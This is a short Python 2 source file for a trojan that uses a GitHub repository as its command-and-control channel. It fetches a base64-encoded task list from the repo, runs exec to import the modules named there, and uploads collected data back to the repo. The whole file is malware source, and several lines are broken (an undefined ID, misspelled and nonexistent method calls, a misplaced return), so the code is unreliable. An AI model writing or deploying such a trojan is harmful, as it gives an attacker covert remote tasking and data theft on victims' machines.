import json
import base64
import sys
import time
import random
import threading
import  Queue
import os

import github3 

trojan_id = abc

trojan_config = "%s.json" % trojan_id

data_path  = "data/%s/" % trojan_id

trojan_modules = []

configured = False

task_queue = Queue.Queue()

def conn_git():
    gh = login(username = "yourusername", password = "yourpassword")

    repo = gh.repository("yourusername","troy")
    branch = repo.branch("main")

    return gh,repo,branch


def get_file_contents(filepath):

    gh,repo,branch = conn_git()
    tree = branch.commit.commit.tree.recure()

    for filename  in tree.tree:

        if filepath in filename.path:
            print (" > Got the file %s" %filepath)

            blob = repo.blob(filename._json_data['sha'])
            return blob.content 

    return None


def get_trojan_config():
    global configured
    config_json  = get_file_contents(trojan_config)
    config       = json.loads(base64.base64decode(config_json))
    configured    = True


    for task in config:

        if task['module'] not in sys.modules:

            exec("import %s"  % task['module'])

        return config


def store_module_result(data):

    gh,repo,branch = conn_git()

    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path, "Committ message", base64.b64encode(data))

    return

    
